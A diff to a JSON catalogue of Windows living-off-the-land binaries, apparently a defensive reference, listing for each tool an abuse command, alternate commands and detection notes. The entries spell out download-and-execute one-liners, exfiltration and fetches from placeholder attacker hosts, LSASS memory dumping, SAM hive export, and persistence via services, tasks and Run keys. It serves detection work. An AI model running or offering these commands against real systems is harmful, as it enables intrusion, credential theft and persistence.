+    "description": "Group Policy script host abusable to execute logon/startup scripts configured by an attacker with GPO edit rights.",
+    "example_command": "gpscript.exe /logon",
+    "alt_commands": [
+      "gpscript.exe /startup"
+    ],
+    "detection_notes": "Flag gpscript.exe invocations outside normal policy-refresh timing, and audit GPO logon/startup script changes.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Gpscript/"
+    ]
+  },
+  {
+    "id": "hh",
+    "name": "hh.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "HTML Help executable abusable to run compiled help (.chm) files that contain scripts, or to launch executables.",
+    "example_command": "hh.exe http://example.com/payload.hta",
+    "alt_commands": [
+      "hh.exe C:\\temp\\payload.chm"
+    ],
+    "detection_notes": "Alert on hh.exe with http(s) URLs or spawning script/command interpreters.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Hh/"
+    ]
+  },
+  {
+    "id": "ieexec",
+    "name": "ieexec.exe",
+    "os": "windows",
+    "category": "Download / Execution / AWL Bypass",
+    "description": ".NET IEExec abusable to download and execute a remote .NET application manifest, bypassing whitelisting.",
+    "example_command": "ieexec.exe http://example.com/payload.exe",
+    "alt_commands": [],
+    "detection_notes": "Very rare; alert on any ieexec.exe execution, especially with an http(s) argument.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Ieexec/"
+    ]
+  },
+  {
+    "id": "installutil",
+    "name": "installutil.exe",
+    "os": "windows",
+    "category": "Execution / AWL Bypass",
+    "description": ".NET Installer utility abusable to execute code in the Uninstall method of a crafted assembly, bypassing whitelisting.",
+    "example_command": "installutil.exe /logfile= /LogToConsole=false /U payload.dll",
+    "alt_commands": [],
+    "detection_notes": "Flag installutil.exe with /U on assemblies in temp/user paths; correlate with csc.exe compilation. Rare outside .NET install workflows.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Installutil/"
+    ]
+  },
+  {
+    "id": "makecab",
+    "name": "makecab.exe",
+    "os": "windows",
+    "category": "Archive / Exfiltration",
+    "description": "Cabinet creation tool abusable to compress/stage data for exfiltration and to package files.",
+    "example_command": "makecab.exe C:\\temp\\secret.txt C:\\temp\\secret.cab",
+    "alt_commands": [],
+    "detection_notes": "Flag makecab.exe packaging sensitive directories or preceding outbound transfers.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Makecab/"
+    ]
+  },
+  {
+    "id": "mavinject",
+    "name": "mavinject.exe",
+    "os": "windows",
+    "category": "Execution / Injection",
+    "description": "App-V injector abusable to inject a DLL into a target process for code execution.",
+    "example_command": "mavinject.exe <PID> /INJECTRUNNING C:\\temp\\payload.dll",
+    "alt_commands": [],
+    "detection_notes": "Alert on any mavinject.exe with /INJECTRUNNING; extremely rare outside App-V environments.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Mavinject/"
+    ]
+  },
+  {
+    "id": "msbuild",
+    "name": "msbuild.exe",
+    "os": "windows",
+    "category": "Execution / AWL Bypass",
+    "description": "Build tool abusable to compile and execute inline C# tasks from a .csproj/.xml, bypassing application whitelisting.",
+    "example_command": "msbuild.exe payload.csproj",
+    "alt_commands": [
+      "msbuild.exe payload.xml"
+    ],
+    "detection_notes": "Rare outside dev machines/CI. Flag msbuild.exe executing files from temp/user-writable paths or inline task XML containing Base64/network calls.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msbuild/"
+    ]
+  },
+  {
+    "id": "msdt",
+    "name": "msdt.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Microsoft Support Diagnostic Tool; abused (CVE-2022-30190 'Follina') to execute code via the ms-msdt protocol from Office docs.",
+    "example_command": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_BrowseForFile=$(calc)i/../..\"",
+    "alt_commands": [],
+    "detection_notes": "Alert on msdt.exe spawned by Office apps (winword/excel) or with a PCWDiagnostic path containing PowerShell/IT_BrowseForFile. Apply the Follina mitigations/patch.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Msdt/"
+    ]
+  },
+  {
+    "id": "mshta",
+    "name": "mshta.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Executes Microsoft HTML Application (.hta) files; commonly abused to run remote scripts/VBScript/JScript.",
+    "example_command": "mshta http://example.com/payload.hta",
+    "alt_commands": [
+      "mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://example.com/payload.sct\"\")\"))",
+      "mshta javascript:a=GetObject('script:http://example.com/payload.sct').Exec();close();"
+    ],
+    "detection_notes": "Monitor mshta.exe with network connections or spawning child processes like powershell.exe/cmd.exe. Rare in normal business use; almost never launches http(s) URLs legitimately.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+    ]
+  },
+  {
+    "id": "msiexec",
+    "name": "msiexec.exe",
+    "os": "windows",
+    "category": "Execution / Download",
+    "description": "Windows Installer abusable to install/execute local or remote MSI packages that carry payloads.",
+    "example_command": "msiexec /q /i http://example.com/payload.msi",
+    "alt_commands": [
+      "msiexec /q /i C:\\temp\\payload.msi",
+      "msiexec /y C:\\temp\\payload.dll"
+    ],
+    "detection_notes": "Alert on msiexec.exe installing packages over http(s) or from temp; /y loads a DLL export. Baseline legitimate software deployment.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/"
+    ]
+  },
+  {
+    "id": "netsh",
+    "name": "netsh.exe",
+    "os": "windows",
+    "category": "Execution / Persistence",
+    "description": "Network shell abusable to load a helper DLL for persistence and to disable firewall/logging.",
+    "example_command": "netsh.exe add helper C:\\temp\\payload.dll",
+    "alt_commands": [
+      "netsh advfirewall set allprofiles state off"
+    ],
+    "detection_notes": "Alert on 'netsh add helper' (persistence) and firewall-disable commands; monitor the NetSh registry helper list.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Netsh/"
+    ]
+  },
+  {
+    "id": "odbcconf",
+    "name": "odbcconf.exe",
+    "os": "windows",
+    "category": "Execution / AWL Bypass",
+    "description": "ODBC configuration tool abusable to load and execute a DLL via the REGSVR action.",
+    "example_command": "odbcconf.exe /a {REGSVR C:\\temp\\payload.dll}",
+    "alt_commands": [
+      "odbcconf /f payload.rsp"
+    ],
+    "detection_notes": "Alert on odbcconf.exe with REGSVR loading DLLs from user-writable paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/"
+    ]
+  },
+  {
+    "id": "pcalua",
+    "name": "pcalua.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Program Compatibility Assistant launcher abusable as a proxy to execute arbitrary programs.",
+    "example_command": "pcalua.exe -a C:\\temp\\payload.exe",
+    "alt_commands": [
+      "pcalua.exe -a \\\\attacker\\share\\payload.dll"
+    ],
+    "detection_notes": "Flag pcalua.exe -a launching binaries from temp/UNC paths; unusual as an execution parent.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Pcalua/"
+    ]
+  },
+  {
+    "id": "pnputil",
+    "name": "pnputil.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "PnP driver utility abusable to run an INF's AddReg/RunOnce sections or stage driver payloads.",
+    "example_command": "pnputil.exe -i -a C:\\temp\\payload.inf",
+    "alt_commands": [],
+    "detection_notes": "Flag pnputil.exe installing INF/driver packages from user-writable paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Pnputil/"
     ]
   },
   {
@@ -120,27 +1635,338 @@
     "name": "powershell.exe",
     "os": "windows",
     "category": "Execution / Download",
-    "description": "Native scripting engine abusable for downloading and executing payloads in-memory, evading disk-based AV.",
+    "description": "Native scripting engine abusable to download and execute payloads in-memory, evading disk-based AV.",
     "example_command": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\"",
     "alt_commands": [
-      "powershell -enc <base64EncodedCommand>"
+      "powershell -enc <base64EncodedCommand>",
+      "powershell -c \"Invoke-WebRequest http://example.com/p.exe -OutFile p.exe\"",
+      "powershell -c \"IEX(IWR http://example.com/p.ps1 -UseBasicParsing)\""
     ],
-    "detection_notes": "Alert on encoded commands (-enc/-EncodedCommand), DownloadString/DownloadFile usage, and hidden window styles combined with network activity.",
+    "detection_notes": "Alert on -enc/-EncodedCommand, DownloadString/DownloadFile/IWR, hidden window styles, and -nop. Enable Script Block Logging (4104) and Module Logging.",
     "references": [
-      "https://lolbas-project.github.io/lolbas/Binaries/Powershell/"
+      "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powershell/"
     ]
   },
   {
-    "id": "msbuild",
-    "name": "msbuild.exe",
+    "id": "presentationhost",
+    "name": "presentationhost.exe",
     "os": "windows",
-    "category": "Execution / Bypass",
-    "description": "Legitimate build tool abusable to compile and execute inline C# tasks, bypassing application whitelisting.",
-    "example_command": "msbuild payload.csproj",
+    "category": "Execution / AWL Bypass",
+    "description": "Runs XAML Browser Applications (.xbap); abusable to execute .NET code and bypass application whitelisting.",
+    "example_command": "presentationhost.exe C:\\temp\\payload.xbap",
     "alt_commands": [],
-    "detection_notes": "Rare in standard environments outside dev machines/CI. Flag msbuild.exe executions with inline task XML containing suspicious code or network calls.",
+    "detection_notes": "Flag presentationhost.exe running .xbap from temp/Downloads or with network activity.",
     "references": [
-      "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/"
+      "https://lolbas-project.github.io/lolbas/Binaries/Presentationhost/"
+    ]
+  },
+  {
+    "id": "print",
+    "name": "print.exe",
+    "os": "windows",
+    "category": "Download / Copy",
+    "description": "Print utility abusable to copy files (including to executable targets) via its /D output redirection.",
+    "example_command": "print.exe /D:C:\\temp\\payload.exe \\\\attacker\\share\\payload.exe",
+    "alt_commands": [],
+    "detection_notes": "Flag print.exe writing to .exe/.dll targets or reading from UNC paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Print/"
+    ]
+  },
+  {
+    "id": "pubprn",
+    "name": "pubprn.vbs",
+    "os": "windows",
+    "category": "Execution / AWL Bypass",
+    "description": "Signed printing script abusable to execute a remote scriptlet (WSF/SCT), bypassing whitelisting.",
+    "example_command": "cscript.exe /nologo C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:http://example.com/payload.sct",
+    "alt_commands": [],
+    "detection_notes": "Flag cscript running pubprn.vbs with a 'script:http' second argument.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Scripts/Pubprn/"
+    ]
+  },
+  {
+    "id": "reg",
+    "name": "reg.exe",
+    "os": "windows",
+    "category": "Persistence / Credential Access",
+    "description": "Registry CLI abusable to establish Run-key persistence and to export credential hives (SAM/SYSTEM/SECURITY).",
+    "example_command": "reg save HKLM\\SAM C:\\temp\\sam.hive & reg save HKLM\\SYSTEM C:\\temp\\system.hive",
+    "alt_commands": [
+      "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\temp\\payload.exe"
+    ],
+    "detection_notes": "Alert on 'reg save' of SAM/SYSTEM/SECURITY hives and Run-key writes pointing to temp/user paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Reg/"
+    ]
+  },
+  {
+    "id": "regasm",
+    "name": "regasm.exe",
+    "os": "windows",
+    "category": "Execution / AWL Bypass",
+    "description": ".NET Assembly Registration tool abusable to run code in ComRegisterFunction/ComUnregisterFunction of a crafted assembly.",
+    "example_command": "regasm.exe /U payload.dll",
+    "alt_commands": [],
+    "detection_notes": "Alert on regasm.exe registering DLLs from user-writable paths; rare on normal endpoints.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Regasm/"
+    ]
+  },
+  {
+    "id": "regsvcs",
+    "name": "regsvcs.exe",
+    "os": "windows",
+    "category": "Execution / AWL Bypass",
+    "description": ".NET Services Installation tool abusable to run code in a crafted COM+ assembly, bypassing whitelisting.",
+    "example_command": "regsvcs.exe payload.dll",
+    "alt_commands": [],
+    "detection_notes": "Similar to regasm — flag execution against assemblies in temp/user paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Regsvcs/"
+    ]
+  },
+  {
+    "id": "regsvr32",
+    "name": "regsvr32.exe",
+    "os": "windows",
+    "category": "Execution / AWL Bypass",
+    "description": "Registers DLLs; abusable via the 'Squiblydoo' technique to execute remote scriptlets, bypassing application whitelisting.",
+    "example_command": "regsvr32 /s /n /u /i:http://example.com/payload.sct scrobj.dll",
+    "alt_commands": [
+      "regsvr32 /s /i:payload.sct scrobj.dll"
+    ],
+    "detection_notes": "Flag regsvr32.exe with '/i:http' in the command line or network connections shortly after execution; alert on scrobj.dll loads.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"
+    ]
+  },
+  {
+    "id": "replace",
+    "name": "replace.exe",
+    "os": "windows",
+    "category": "Download / Copy",
+    "description": "File replacement utility abusable to copy files from UNC/WebDAV paths.",
+    "example_command": "replace.exe \\\\attacker\\share\\payload.exe C:\\temp\\ /A",
+    "alt_commands": [],
+    "detection_notes": "Flag replace.exe with UNC source paths writing to user-writable directories.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Replace/"
+    ]
+  },
+  {
+    "id": "rundll32",
+    "name": "rundll32.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Runs exported functions in DLLs; abusable to execute arbitrary code, JavaScript, or dump process memory via comsvcs.dll.",
+    "example_command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://example.com/payload.sct\")",
+    "alt_commands": [
+      "rundll32.exe pcwutl.dll,LaunchApplication calc.exe",
+      "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\lsass.dmp full",
+      "rundll32.exe advpack.dll,LaunchINFSection payload.inf,DefaultInstall_SingleUser,1,"
+    ],
+    "detection_notes": "Baseline normal rundll32 usage per environment; alert on unusual exports (LaunchApplication, RunHTMLApplication, MiniDump), comsvcs.dll+lsass, or network activity.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/"
+    ]
+  },
+  {
+    "id": "sc",
+    "name": "sc.exe",
+    "os": "windows",
+    "category": "Persistence / Execution / Lateral Movement",
+    "description": "Service Control Manager CLI abusable to create/modify services (locally or remotely) that run attacker binaries as SYSTEM.",
+    "example_command": "sc.exe create Updater binPath= \"C:\\temp\\payload.exe\" start= auto & sc.exe start Updater",
+    "alt_commands": [
+      "sc.exe \\\\TARGET create Updater binPath= \"C:\\temp\\payload.exe\""
+    ],
+    "detection_notes": "Monitor service creation (event 7045/4697) with binaries in temp/user paths or remote \\\\host targets.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Sc/"
+    ]
+  },
+  {
+    "id": "schtasks",
+    "name": "schtasks.exe",
+    "os": "windows",
+    "category": "Persistence / Execution / Lateral Movement",
+    "description": "Task Scheduler CLI abusable for persistence and remote execution by creating scheduled tasks locally or on remote hosts.",
+    "example_command": "schtasks /create /tn Updater /tr \"powershell -nop -w hidden -c IEX(...)\" /sc onlogon /ru System",
+    "alt_commands": [
+      "schtasks /create /s TARGET /tn Updater /tr C:\\temp\\payload.exe /sc once /st 00:00 /ru System"
+    ],
+    "detection_notes": "Monitor task creation (event 4698) with suspicious actions (powershell/cmd, temp paths), /ru System, or remote /s targets.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Schtasks/"
+    ]
+  },
+  {
+    "id": "shell32",
+    "name": "shell32.dll",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Windows shell library abused (via rundll32) to execute programs and Control Panel applets.",
+    "example_command": "rundll32.exe shell32.dll,Control_RunDLL C:\\temp\\payload.cpl",
+    "alt_commands": [
+      "rundll32.exe shell32.dll,ShellExec_RunDLL C:\\temp\\payload.exe"
+    ],
+    "detection_notes": "Flag rundll32 loading shell32.dll with ShellExec_RunDLL/Control_RunDLL against temp/user paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Libraries/Shell32/"
+    ]
+  },
+  {
+    "id": "syncappvpublishingserver",
+    "name": "SyncAppvPublishingServer.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "App-V publishing utility abusable to run arbitrary PowerShell via its argument injection.",
+    "example_command": "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('http://example.com/p.ps1')|IEX\"",
+    "alt_commands": [],
+    "detection_notes": "Alert on SyncAppvPublishingServer.exe with a ';'-delimited PowerShell payload; extremely rare in normal use.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/"
+    ]
+  },
+  {
+    "id": "syncappvpublishingserver-vbs",
+    "name": "SyncAppvPublishingServer.vbs",
+    "os": "windows",
+    "category": "Execution",
+    "description": "App-V publishing script abusable to run arbitrary PowerShell via argument injection.",
+    "example_command": "SyncAppvPublishingServer.vbs \"n;(New-Object Net.WebClient).DownloadString('http://example.com/p.ps1')|IEX\"",
+    "alt_commands": [],
+    "detection_notes": "Alert on wscript/cscript running SyncAppvPublishingServer.vbs with an embedded PowerShell payload.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/"
+    ]
+  },
+  {
+    "id": "tftp",
+    "name": "tftp.exe",
+    "os": "windows",
+    "category": "Download / Exfiltration",
+    "description": "Trivial FTP client abusable to download or exfiltrate files over UDP/69.",
+    "example_command": "tftp -i ATTACKER_IP GET payload.exe C:\\temp\\payload.exe",
+    "alt_commands": [
+      "tftp -i ATTACKER_IP PUT C:\\temp\\secret.txt"
+    ],
+    "detection_notes": "Flag any tftp.exe usage on modern endpoints; rare and often malicious.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Tftp/"
+    ]
+  },
+  {
+    "id": "url",
+    "name": "url.dll",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Internet shortcut library abused (via rundll32) to open URLs/HTA and trigger execution.",
+    "example_command": "rundll32.exe url.dll,OpenURL C:\\temp\\payload.hta",
+    "alt_commands": [
+      "rundll32.exe url.dll,FileProtocolHandler file://C:\\temp\\payload.exe"
+    ],
+    "detection_notes": "Flag rundll32 loading url.dll with OpenURL/FileProtocolHandler pointing at HTA/executables.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Libraries/Url/"
+    ]
+  },
+  {
+    "id": "verclsid",
+    "name": "verclsid.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Shell extension verifier abusable to instantiate a COM object (CLSID) and trigger attacker code.",
+    "example_command": "verclsid.exe /S /C {CLSID}",
+    "alt_commands": [],
+    "detection_notes": "Rare; alert on verclsid.exe with attacker-registered CLSIDs.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Verclsid/"
+    ]
+  },
+  {
+    "id": "winrm-vbs",
+    "name": "winrm.vbs",
+    "os": "windows",
+    "category": "Execution / AWL Bypass",
+    "description": "WinRM management script abusable (via a crafted XSL) to execute code, bypassing whitelisting.",
+    "example_command": "cscript.exe //nologo winrm.vbs get wmicimv2/Win32_Process -format:\"pretty:C:\\temp\\payload.xsl\"",
+    "alt_commands": [],
+    "detection_notes": "Flag cscript running winrm.vbs with a local/remote XSL 'format' argument.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Scripts/Winrm/"
+    ]
+  },
+  {
+    "id": "wmic",
+    "name": "wmic.exe",
+    "os": "windows",
+    "category": "Execution / Lateral Movement",
+    "description": "WMI command tool abusable for remote process creation, recon, and XSL-based script execution.",
+    "example_command": "wmic /node:TARGET process call create \"cmd.exe /c calc.exe\"",
+    "alt_commands": [
+      "wmic os get /format:\"http://example.com/payload.xsl\"",
+      "wmic process get brief /format:\"payload.xsl\""
+    ],
+    "detection_notes": "Monitor wmic.exe with 'process call create' (especially /node: remote), and 'format:' XSL abuse. Deprecated by Microsoft — presence is increasingly suspicious.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
+    ]
+  },
+  {
+    "id": "wscript",
+    "name": "wscript.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Windows Script Host (GUI) used to run VBScript/JScript, a frequent initial-access execution vector.",
+    "example_command": "wscript.exe C:\\temp\\payload.vbs",
+    "alt_commands": [
+      "wscript /e:jscript C:\\temp\\payload.txt"
+    ],
+    "detection_notes": "Alert on wscript.exe launched from Office apps, archives, or temp paths; correlate with child powershell/cmd and network activity.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wscript/"
+    ]
+  },
+  {
+    "id": "wuauclt",
+    "name": "wuauclt.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Windows Update client abusable to run a DLL via the UpdateDeploymentProvider RunHandlerComServer sequence.",
+    "example_command": "wuauclt.exe /UpdateDeploymentProvider C:\\temp\\payload.dll /RunHandlerComServer",
+    "alt_commands": [],
+    "detection_notes": "Flag wuauclt.exe with /UpdateDeploymentProvider referencing a non-system DLL path.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Wuauclt/"
+    ]
+  },
+  {
+    "id": "xwizard",
+    "name": "xwizard.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Extensible wizard host abusable to run a registered CLSID/DLL or side-load a custom XML.",
+    "example_command": "xwizard.exe RunWizard {00000001-0000-0000-0000-0000FEEDACDC}",
+    "alt_commands": [],
+    "detection_notes": "Rare; alert on xwizard.exe RunWizard with attacker-registered CLSIDs or execution from user paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Xwizard/"
+    ]
+  },
+  {
+    "id": "zipfldr",
+    "name": "zipfldr.dll",
+    "os": "windows",
+    "category": "Execution / Archive",
+    "description": "Compressed-folders shell library abused (via rundll32) to run a target via RouteTheCall.",
+    "example_command": "rundll32.exe zipfldr.dll,RouteTheCall C:\\temp\\payload.exe",
+    "alt_commands": [],
+    "detection_notes": "Flag rundll32 loading zipfldr.dll with RouteTheCall to execute binaries from temp/user paths.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Libraries/Zipfldr/"
     ]
   }
 ]
